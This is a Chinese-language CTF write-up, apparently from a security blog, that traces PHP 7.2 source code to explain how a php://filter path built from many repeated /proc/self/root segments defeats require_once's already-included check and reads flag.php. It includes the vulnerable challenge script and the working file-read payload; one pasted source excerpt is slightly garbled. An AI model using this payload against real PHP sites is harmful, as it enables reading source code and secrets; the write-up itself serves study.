> 原文链接: https://www.anquanke.com//post/id/213235 


# php源码分析 require_once 绕过不能重复包含文件的限制


                                阅读量   
                                **299137**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t012720deefbf6d74f4.png)](https://p4.ssl.qhimg.com/t012720deefbf6d74f4.png)



## 简介

众所周知，在php中，`require_once`在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含，那么我们可以尝试绕过这个机制吗？不写入webshell只读文件有办法吗？

```
&lt;?php
error_reporting(E_ALL);
require_once('flag.php');
highlight_file(__FILE__);
if(isset($_GET['content'])) `{`
    $content = $_GET['content'];
    require_once($content);
`}` //题目的代码来自WMCTF2020 make php great again 2.0 绕过require_once是预期解
```

php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经`require_once('flag.php')`，已经include的文件不可以再require_once。

今天就来谈谈，怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。

在这里有个小知识点，`/proc/self`指向当前进程的`/proc/pid/`，`/proc/self/root/`是指向`/`的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:

```
php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

//result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo=
```

接下来我们将对绕过的原理进行分析，php7.2.23的源码进行分析，建议配合Clion在linux里进行调试，至于如何搭建调试环境，可以自行搜索，参考一些别的文章。



## 分析

### <a class="reference-link" name="0x00%20%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86"></a>0x00 思路整理

那么为什么可以呢？，既然是包含文件，我们可以先从`zend_execute.c: zend_include_or_eval()`这个函数看起，这里有一堆switch case：

```
case ZEND_REQUIRE_ONCE: `{`
    zend_file_handle file_handle;
    zend_string *resolved_path;

    resolved_path = zend_resolve_path(Z_STRVAL_P(inc_filename), (int)Z_STRLEN_P(inc_filename));
    //解析文件的真实路径，按文件的真实路径去访问文件
    //如果不存在则先不动，原样复制，后面用zend_stream_open伪协议的办法访问
    //若文件名给定的是scheme://开头的字符串，只有当wrapper == &amp;php_plain_files_wrapper的时候fopen_wrappers.c: php_resolve_path()才对路径进行解析，否则返回NULL
    //很明显，我们给的是个php://伪协议，所以zend_resolve_path失败，返回NULL，进入else。
    if (resolved_path) `{`
        //绕过去了
        if (zend_hash_exists(&amp;EG(included_files), resolved_path)) `{`
            //去哈希表匹配对应的文件路径
            goto already_compiled;
        `}`
    `}` else `{`
        //现在直接拷贝，原来什么样现在什么样
        resolved_path = zend_string_copy(Z_STR_P(inc_filename));
    `}`

    //开始用伪协议的方式进行文件包含，路径解析的结果将被写入file_handle.opened_path里
    if (SUCCESS == zend_stream_open(ZSTR_VAL(resolved_path), &amp;file_handle)) `{`
        //解析结果：/proc/24273/root/proc/self/root/var/www/html/flag.php
        if (!file_handle.opened_path) `{`
            //不会被执行
            file_handle.opened_path = zend_string_copy(resolved_path);
        `}`

        if (zend_hash_add_empty_element(&amp;EG(included_files), file_handle.opened_path)) `{`
            zend_op_array *op_array = zend_compile_file(&amp;file_handle, (type==ZEND_INCLUDE_ONCE?ZEND_INCLUDE:ZEND_REQUIRE));
            zend_destroy_file_handle(&amp;file_handle);
            zend_string_release(resolved_path);
            if (Z_TYPE(tmp_inc_filename) != IS_UNDEF) `{`
                zend_string_release(Z_STR(tmp_inc_filename));
            `}`
            return op_array;
        `}` else `{`
            zend_file_handle_dtor(&amp;file_handle);
            already_compiled:
            new_op_array = ZEND_FAKE_OP_ARRAY;
        `}`
    `}` else `{`
        if (type == ZEND_INCLUDE_ONCE) `{`
            zend_message_dispatcher(ZMSG_FAILED_INCLUDE_FOPEN, Z_STRVAL_P(inc_filename));
        `}` else `{`
            zend_message_dispatcher(ZMSG_FAILED_REQUIRE_FOPEN, Z_STRVAL_P(inc_filename));
        `}`
    `}`
    zend_string_release(resolved_path);
`}`
break;
```

php要怎么判断一个文件之前有没有被包含过呢？那当然去哈希表里找啦，在去哈希表里找之前，得先把文件名过滤干净（比如说`/flag.php/../flag.php`最后还是会回到`/flag.php`，php可不傻），然后再放进哈希表里匹配。

按照我们给定的代码，include的顺序应该是`index.php -&gt; flag.php -&gt; $content`所以我们给了个伪协议，就先绕过去了，但是如果`/proc/self/root`的长度给短了，会发现解析出来的`opened_path`变成了`/var/www/html/flag.php`，为什么呢？我们可以跟踪一下代码，当进行`require_once($content)`跟进`zend_stream_open()`，找到`opened_path`被修改的地方。

### <a class="reference-link" name="0x01%20%E6%AD%A5%E5%85%A5%E6%AD%A3%E8%BD%A8"></a>0x01 步入正轨

跟跟跟，发现在`php_stream_open_for_zend_ex`里，`&amp;handle-&gt;opened_path`的指针被作为第三个参数传递出去了，给了`_php_stream_open_wrapper_ex()`，然后经过一番波折返回回去。

我们可以用Clion的计算表达式功能看一下它的地址`&amp;handle-&gt;opened_path`，这里是`0x7ffd908b3580`。，我们得知道它在哪里被修改的，修改的值在哪生成的。先发现它是由`plain_wrapper.c: _php_stream_fopen()`第1026行进行写入：

```
/*
此时_php_stream_open_wrapper_ex执行到了这里：

    if (wrapper) `{`
        if (!wrapper-&gt;wops-&gt;stream_opener) `{`
            php_stream_wrapper_log_error(wrapper, options ^ REPORT_ERRORS,
                    "wrapper does not support stream open");
        `}` else `{`
----&gt;        stream = wrapper-&gt;wops-&gt;stream_opener(wrapper,
                path_to_open, mode, options ^ REPORT_ERRORS,
                opened_path, context STREAMS_REL_CC);
        `}`
*/

#ifdef PHP_WIN32
    fd = php_win32_ioutil_open(realpath, open_flags, 0666);
#else
    fd = open(realpath, open_flags, 0666);
#endif
    if (fd != -1)    `{`

        if (options &amp; STREAM_OPEN_FOR_INCLUDE) `{`
            ret = php_stream_fopen_from_fd_int_rel(fd, mode, persistent_id);
        `}` else `{`
            ret = php_stream_fopen_from_fd_rel(fd, mode, persistent_id);
        `}`

        if (ret)    `{`
            if (opened_path) `{`
                //由realpath写入opened_path
                *opened_path = zend_string_init(realpath, strlen(realpath), 0);
            `}`
            if (persistent_id) `{`
                efree(persistent_id);
            `}`
```

知道了哪里写的，那怎么来的就好找到了，用计算表达式的功能，取址，记下来：`0x7ffebc13cd50`。

同样在这个函数里，往前翻一点点，注意到了这。是`expand_filepath`它改写了`realpath`，而`realpath`就是想要的`/proc/24273/root/proc/self/root/var/www/html/flag.php`：

```
if (options &amp; STREAM_ASSUME_REALPATH) `{`
    //直接把传入的filename当成真实路径处理，然而没有执行这里
    strlcpy(realpath, filename, sizeof(realpath));
`}` else `{`
    if (expand_filepath(filename, realpath) == NULL) `{`
        //对文件名进行路径扩展，找到真实的路径
        return NULL;
    `}`
`}`
```

跟进去，发现是在`virtual_file_ex`里，调用`tsrm_realpath_r`获取解析结果`resolved_path`，处理了一番，把结果通过`state`带回去

```
add_slash = (use_realpath != CWD_REALPATH) &amp;&amp; path_length &gt; 0 &amp;&amp; IS_SLASH(resolved_path[path_length-1]);
t = CWDG(realpath_cache_ttl) ? 0 : -1;
path_length = tsrm_realpath_r(resolved_path, start, path_length, &amp;ll, &amp;t, use_realpath, 0, NULL);
//路径解析结果真正是从tsrm_realpath_r来的，通过resolved_path传过来
//值就是'/proc/24273/root/proc/self/root/var/www/html/flag.php'
//然后经过下面的处理一下，实际上根本没处理什么

...

if (verify_path) `{`
    ...
`}` else `{`
    state-&gt;cwd_length = path_length;
    tmp = erealloc(state-&gt;cwd, state-&gt;cwd_length+1);
    state-&gt;cwd = (char *) tmp;
    //在这里把结果先写入了state-&gt;cwd，通过这个state把结果带回去
    memcpy(state-&gt;cwd, resolved_path, state-&gt;cwd_length+1);
    ret = 0;
`}`
/* Stacktrace
virtual_file_ex zend_virtual_cwd.c:1385
expand_filepath_with_mode fopen_wrappers.c:816
expand_filepath_ex fopen_wrappers.c:754
expand_filepath fopen_wrappers.c:746
_php_stream_fopen plain_wrapper.c:991
*/
```

然后在`expand_filepath_with_mode`这里写入：

```
if (virtual_file_ex(&amp;new_state, filepath, NULL, realpath_mode)) `{`
    //刚才的virtual_file_ex没忘吧，结果在new_state-&gt;cwd里面
    efree(new_state.cwd);
    return NULL;
`}`

if (real_path) `{`
    copy_len = new_state.cwd_length &gt; MAXPATHLEN - 1 ? MAXPATHLEN - 1 : new_state.cwd_length;
    memcpy(real_path, new_state.cwd, copy_len);
    //在这在这，这里写进去了，不信看看real_path的地址是不是0x7ffebc13cd50
    real_path[copy_len] = '\0';
`}` else `{`
    real_path = estrndup(new_state.cwd, new_state.cwd_length);
`}`
```

### <a class="reference-link" name="0x02%20%E8%B7%AF%E5%BE%84%E7%9A%84%E8%A7%A3%E6%9E%90"></a>0x02 路径的解析

验证了从哪里来，要到哪里去，那现在就该看看是怎么蹦出来的了。

`tsrm_realpath_r`是用来解析真实路径的，这一堆解析字符串的代码看着就让人头大，而且还递归调用。

这个函数做了哪些事情呢？从后往前进行匹配，对于`. .. //`等进行特殊处理，特殊处理后重新调整路径的总长度，比如遇到`/var/www/..`的时候就移除掉`www/..`，剩下`/var`，再进行下面的操作。最后把路径传入`tsrm_realpath_r`继续递归调用。

那先让他递归调用好了，递归到要返回的最后一层，看看每一层递归时函数接受的参数就好办了。

简单来说，递归机制是从后往前，`/var/www/html/1.php -&gt; /var/www/html -&gt; /var/www`。

我们发现堆栈长这样子，似乎一切从那个1173行开始就不一样了，为什么呢，那我们得重新跟一次，记下这是第几次递归，断点还是下在`tsrm_realpath_r`的首行，重新跟的时候数下递归了几次，找到这次调用有啥不同，最简单的办法就是递归几次就按几次F9（继续执行程序），为了方便起见，我们把来自1137行的调用记为第`n`次递归，简称`(n)`：

```
tsrm_realpath_r zend_virtual_cwd.c:756  (n+4) return 1
tsrm_realpath_r zend_virtual_cwd.c:1124 (n+3) return 1
tsrm_realpath_r zend_virtual_cwd.c:1164 (n+2) return 5
tsrm_realpath_r zend_virtual_cwd.c:1164 (n+1)
tsrm_realpath_r zend_virtual_cwd.c:1137 (n)
tsrm_realpath_r zend_virtual_cwd.c:1164 (n-1)
tsrm_realpath_r zend_virtual_cwd.c:1164
...
tsrm_realpath_r zend_virtual_cwd.c:1164 (1)
tsrm_realpath_r zend_virtual_cwd.c:1164
```

去掉`ZEND_WIN32`的无关部分，实际上我们可以发现，每次递归都会对`. .. //`特殊情况进行处理，然后之前的一大堆`(0)...(n-1)`，`php_sys_lstat(path, &amp;st)`的返回值都是`-1`，而到了`(n)`，可以发现`php_sys_lstat(path, &amp;st)`为`0`

```
static int tsrm_realpath_r(char *path, int start, int len, int *ll, time_t *t, int use_realpath, int is_dir, int *link_is_dir) /* `{``{``{` */
`{`
    int i, j, save;
    int directory = 0;
#ifdef ZEND_WIN32
    ...
#else
    zend_stat_t st;
#endif
    realpath_cache_bucket *bucket;
    char *tmp;
    ALLOCA_FLAG(use_heap)

    while (1) `{`
        if (len &lt;= start) `{`
            if (link_is_dir) `{`
                *link_is_dir = 1;
            `}`
            return start;
        `}`

        i = len;
        while (i &gt; start &amp;&amp; !IS_SLASH(path[i-1])) `{`
            i--;
        `}`
        /* 对. .. //这三种情况进行特殊处理 */
        if (i == len ||
            (i == len - 1 &amp;&amp; path[i] == '.')) `{`
            /* remove double slashes and '.' */
            ...
        `}` else if (i == len - 2 &amp;&amp; path[i] == '.' &amp;&amp; path[i+1] == '.') `{`
            /* remove '..' and previous directory */
            ...
        `}`

        path[len] = 0;
        save = (use_realpath != CWD_EXPAND);
        if (start &amp;&amp; save &amp;&amp; CWDG(realpath_cache_size_limit)) `{`
            /* cache lookup for absolute path */
            ...
        `}`

#ifdef ZEND_WIN32
    ...
#else
        //(0)...(n-1)的save值到这都是1
        if (save &amp;&amp; php_sys_lstat(path, &amp;st) &lt; 0) `{`
            //(0)..(n-1)可以进入到这里，因为php_sys_lstat(path, &amp;st)=-1，而(n)以及之后的都不行！
            if (use_realpath == CWD_REALPATH) `{`
                /* file not found */
                return -1;
            `}`
            /* continue resolution anyway but don't save result in the cache */
             //(0)..(n-1)的save都是0
            save = 0;
        `}`

        tmp = do_alloca(len+1, use_heap);
         //把path拷贝一份给tmp
        memcpy(tmp, path, len+1);

        //因为(n)的save是1，所以继续判断是不是符号链接
        //st.st_mode是文件的类型和权限，S_ISLNK返回是不是符号链接
        if (save &amp;&amp; S_ISLNK(st.st_mode)) `{`
             //调用前的path为：
             //php_sys_readlink就是读取符号链接所指向的真实位置，并写入到path变量，j是长度
            if (++(*ll) &gt; LINK_MAX || (j = php_sys_readlink(tmp, path, MAXPATHLEN)) &lt; 0) `{`
                /* too many links or broken symlinks */
                free_alloca(tmp, use_heap);
                return -1;
            `}`
            path[j] = 0;
             //末尾补上\0，完成读取，此时的path是进程的pid
            if (IS_ABSOLUTE_PATH(path, j)) `{`
                  //
                j = tsrm_realpath_r(path, 1, j, ll, t, use_realpath, is_dir, &amp;directory);
                if (j &lt; 0) `{`
                    free_alloca(tmp, use_heap);
                    return -1;
                `}`
                j = tsrm_realpath_r(path, 1, j, ll, t, use_realpath, is_dir, &amp;directory);
                if (j &lt; 0) `{`
                    free_alloca(tmp, use_heap);
                    return -1;
                `}`
            `}` else `{`
                if (i + j &gt;= MAXPATHLEN-1) `{`
                    free_alloca(tmp, use_heap);
                    return -1; /* buffer overflow */
                `}`
                memmove(path+i, path, j+1);
                memcpy(path, tmp, i-1);
                path[i-1] = DEFAULT_SLASH;
                j = if
            if (i - 1 &lt;= start) `{`
                j = start;
            `}` else `{`
                /* some leading directories may be unaccessable */
                j = tsrm_realpath_r(path, start, i-1, ll, t, save ? CWD_FILEPATH : use_realpath, 1, NULL); //第1164行，(1)...(n)的调用来源。
                if (j &gt; start) `{`
                    path[j++] = DEFAULT_SLASH;
                `}`
            `}`
            if (j &lt; 0 || j + len - i &gt;= MAXPATHLEN-1) `{`
                free_alloca(tmp, use_heap);
                return -1;
            `}`
            memcpy(path+j, tmp+i, len-i+1);
            j += (len-i);
        `}`
        if (save &amp;&amp; start &amp;&amp; CWDG(realpath_cache_size_limit)) `{`
            /* save absolute path in the cache */
            realpath_cache_add(tmp, len, path, j, directory, *t);
        `}`

        free_alloca(tmp, use_heap);
        return j;
    `}`
`}`
```

### <a class="reference-link" name="0x03%20%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5"></a>0x03 符号链接

仔细想想我们的payload是什么？循环构造符号链接？那`php_sys_lstat()`是啥？

`php_sys_lstat()`实际上就是linux的`lstat()`，这个函数是用来获取一些文件相关的信息，成功执行时，返回0。失败返回-1，并且会设置`errno`，因为之前符号链接过多，所以`errno`就都是`ELOOP`，符号链接的循环数量真正取决于`SYMLOOP_MAX`，这是个`runtime-value`，它的值不能小于`_POSIX_SYMLOOP_MAX`。

我们也可以在执行了`php_sys_lstat()`之后调用`perror()`验证`errno`是不是`ELOOP`。

参考了文档[sysconf](https://man7.org/linux/man-pages/man3/sysconf.3.html)，还是通过Clion的计算表达式功能，算下`sysconf(_SC_SYMLOOP_MAX)`和`sysconf(_POSIX_SYMLOOP_MAX)`，但是这回没有成功，`SYMLOOP_MAX`居然是`-1`，那我们用其他办法获取，最简单的办法就是手动实践，暴力获取。

```
import os
os.system("echo 233&gt; l00")
for i in range(0,99):
    os.system("ln -s l%02d l%02d"%(i,i+1))
```

然后ls -al一下，发现`l42`这个符号链接就无效了，最后一个有效的符号链接是`l41`，所以有效的应该是`41-&gt;40, 40-&gt;39 ..., 01-&gt;00`，一共41个，所以`SYMLOOP_MAX`是`40`，指向符号链接的符号链接的个数是40。

所以一大堆`/proc/self/root`拼一起，从后往前倒，递归调用`tsrm_real_path_r`，直到`php_sys_lstat`返回`0`，即成功。

成功时的path内容见如下，`/proc/self`是个符号链接指向当前进程`pid`，`self`底下的`root`也是个符号链接，所以算下，也是41个，正正好吧？

```
&gt;&gt;&gt; a = "/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self"
&gt;&gt;&gt; print(a.count("self")+a.count("root"))
41
```

验证一下：用Clion计算表达式功能，我们可以发现：

```
lstat("/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self") 返回 0
lstat("/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root") 返回 -1
```

### <a class="reference-link" name="0x04%20%E9%80%92%E5%BD%92%E9%80%90%E5%B1%82%E5%89%96%E6%9E%90"></a>0x04 递归逐层剖析

然后既然`php_sys_lstat()`为1，在`(n)`它干了什么？

```
//刚刚调试的结果是(n)以及它之后的save都为1
//"/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self"就是/proc/self，是个符号链接，为进程的pid，S_ISLNK判断是不是符号链接
if (save &amp;&amp; S_ISLNK(st.st_mode)) `{`
    //调用前的path为：
    //php_sys_readlink就是读取符号链接所指向的真实位置，并写入到path变量，j是长度
    if (++(*ll) &gt; LINK_MAX || (j = php_sys_readlink(tmp, path, MAXPATHLEN)) &lt; 0) `{`
        /* too many links or broken symlinks */
        free_alloca(tmp, use_heap);
        return -1;
    `}`
    path[j] = 0;
    //末尾补上\0，完成读取，此时的path是进程的pid，path="24273"
    if (IS_ABSOLUTE_PATH(path, j)) `{`
        //很明显"24273"不是个绝对路径，去看else
        j = tsrm_realpath_r(path, 1, j, ll, t, use_realpath, is_dir, &amp;directory);
        if (j &lt; 0) `{`
            free_alloca(tmp, use_heap);
            return -1;
        `}`
    `}` else `{`
        if (i + j &gt;= MAXPATHLEN-1) `{`
            free_alloca(tmp, use_heap);
            return -1; /* buffer overflow */
        `}`
        //开始构造路径，先把path[0...j]往后挪，放到path[i]的位置上
        //j+1是个数，从下标0到下标j当然是j+1个
        memmove(path+i, path, j+1);
        //把tmp[0...i-1]拷贝回path[0...i-2]
        //i-1是个数，下标0到下标i-2是i-1个
        memcpy(path, tmp, i-1);
        path[i-1] = DEFAULT_SLASH;
        //加个/上去，这时候的path：
        //"/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/24273"


        j = tsrm_realpath_r(path, start, i + j, ll, t, use_realpath, is_dir, &amp;directory);
        //进行(n+1)的递归调用
        if (j &lt; 0) `{`
            free_alloca(tmp, use_heap);
            return -1;
        `}`
    `}`
    if (link_is_dir) `{`
        *link_is_dir = directory;
    `}`
`}`
```

(n+1)次的时候，此时path不再是符号链接，因此进入else：

```
`}` else `{`
    if (save) `{`
        directory = S_ISDIR(st.st_mode);
        //由传入的link_is_dir变量，是的话把指针指向directory
        if (link_is_dir) `{`
            *link_is_dir = directory;
        `}`
        if (is_dir &amp;&amp; !directory) `{`
            /* not a directory */
            free_alloca(tmp, use_heap);
            return -1;
        `}`
    `}`
    if (i - 1 &lt;= start) `{`
        j = start;
    `}` else `{`
        /* some leading directories may be unaccessable */
        //1164行，又进到了这里，save=1，进行(n+2)递归调用，把自己的use_realpath参数也给传进去。
        //path没变，和(n)一样，但是传入的link_is_dir变成了NULL
        j = tsrm_realpath_r(path, start, i-1, ll, t, save ? CWD_FILEPATH : use_realpath, 1, NULL);
        //拿到的j=1
        if (j &gt; start) `{`
            path[j++] = DEFAULT_SLASH;
        `}`
    `}`
    #ifdef ZEND_WIN32
        ...
    #else
    if (j &lt; 0 || j + len - i &gt;= MAXPATHLEN-1) `{`
        free_alloca(tmp, use_heap);
        return -1;
    `}`
    //前面拿到j=1，tmp[i...len-i]复制到path[1...1+len-i]
    //就是把tmp的最后几个字符复制到path的前面去
    memcpy(path+j, tmp+i, len-i+1);
    j += (len-i);
    //重新计算总长度，返回回去，新的path是"/proc"，j=5。
`}`
```

(n+2)和(n+1)一样，也在1164行进行下一次递归调用，(n+2)传递给(n+3)的参数：

```
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc
```

在(n+3)时，经过`tsrm_realpath_r`前面的处理，path的最后一个`/proc`没了，这时候剩下的`/proc/self.../root`就又是一个符号链接。

老样子，既然是符号链接，save又是1，那么就调用php_sys_readlink读取符号链接，读的结果是什么？是`/`。

```
if (++(*ll) &gt; LINK_MAX || (j = php_sys_readlink(tmp, path, MAXPATHLEN)) &lt; 0) `{`
    /* too many links or broken symlinks */
    free_alloca(tmp, use_heap);
    return -1;
`}`
path[j] = 0;
//path = "/", j = 1
if (IS_ABSOLUTE_PATH(path, j)) `{`
    //进到了这里 is_dir =1 ,directory=0，进行(n+4)，这是最后一次
    //tsrm_realpath_r("/", 1, 1, ll, t, 1, 1, &amp;directory)，返回值为j=1
    j = tsrm_realpath_r(path, 1, j, ll, t, use_realpath, is_dir, &amp;directory);
    if (j &lt; 0) `{`
        free_alloca(tmp, use_heap);
        return -1;
    `}`
`}` else `{`
    ...
`}`
if (link_is_dir) `{`
    *link_is_dir = directory;
`}`
```

### <a class="reference-link" name="0x05%20%E9%80%92%E5%BD%92%E8%B0%83%E7%94%A8%E8%BF%94%E5%9B%9E"></a>0x05 递归调用返回

然后在(n+4)前面的while(1)，由于`len &lt;= start`，所以直接提前返回，返回值为`start=1`：

```
while (1) `{`
    //len=1,start=1
    if (len &lt;= start) `{`
        if (link_is_dir) `{`
            *link_is_dir = 1;
        `}`
        return start;
    `}`
```

从(n+3)开始返回回去，给(n+2)的返回值也是`1`，但是(n+2)返回(n+1)的时候做了别的事情：

```
`}` else `{`
if (save) `{`
        ...
    `}`
    if (i - 1 &lt;= start) `{`
        j = start;
    `}` else `{`
        /* some leading directories may be unaccessable */

        j = tsrm_realpath_r(path, start, i-1, ll, t, save ? CWD_FILEPATH : use_realpath, 1, NULL);
        //j=1, start=1
        if (j &gt; start) `{`
            path[j++] = DEFAULT_SLASH;
        `}`
    `}`
    if (j &lt; 0 || j + len - i &gt;= MAXPATHLEN-1) `{`
        free_alloca(tmp, use_heap);
        return -1;
    `}`
    //前面拿到j=1，tmp[1...len-i]复制到path[1...1+len-i]
    //len是原来传进来的字符串的总长度，i和len是tsrm_real_path_r对'.. . //'特殊处理之前决定的
    //比如path是'/var/www/html/'，那这里的i就在html之后的/上面
    /*
        761 i = len;
        762 while (i &gt; start &amp;&amp; !IS_SLASH(path[i-1])) `{`
        763    i--;
        764 `}`
    */
    //
    memcpy(path+j, tmp+i, len-i+1);
    j += (len-i);
    //重新计算总长度，返回回去，新的path是"/proc/"，j=5，最后返回给(n+1)。

`}`
```

(n+1)返回给(n)：

```
`}` else `{`
    if (save) `{`
        ...
    `}`
    if (i - 1 &lt;= start) `{`
        j = start;
    `}` else `{`
        /* some leading directories may be unaccessable */

        j = tsrm_realpath_r(path, start, i-1, ll, t, save ? CWD_FILEPATH : use_realpath, 1, NULL);
        //path="/proc", j=5, start=1
        if (j &gt; start) `{`
            path[j++] = DEFAULT_SLASH;
            //末尾加个'/', j+=1, 现在j=6
        `}`
    `}`
    if (j &lt; 0 || j + len - i &gt;= MAXPATHLEN-1) `{`
        free_alloca(tmp, use_heap);
        return -1;
    `}`
    //前面拿到j=6，tmp[i...len-i]复制到path[6...6+len-i]
    /*
    tmp="/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/74079"

    */
    memcpy(path+j, tmp+i, len-i+1);
    j += (len-i);
    //重新计算总长度，返回回去，新的path是"/proc/24273"，j=11，最后返回给(n)。

`}`
```

最后从(n)返回到(0)就是逐个复制并拼合路径了，最后得到的就是`/proc/24273/root/proc/self/root/var/www/html/flag.php`



## 总结

调试源代码时，最好是采用自顶向下的方法。

想知道一个值从哪来到哪去，如果是以指针传递，可以获取其地址，观察函数调用堆栈里的参数的地址值。

调试的时候多利用IDE的计算表达式的功能，也可以利用条件断点的功能来辅助调试，甚至也可以直接往控制台输出信息。

若遇到递归调用的函数，先分析这个函数做了什么，找出其边界情况，在最后一次递归时，根据堆栈观察每次递归时的参数传递和数据的变化。

作者：ROIS – littlefisher
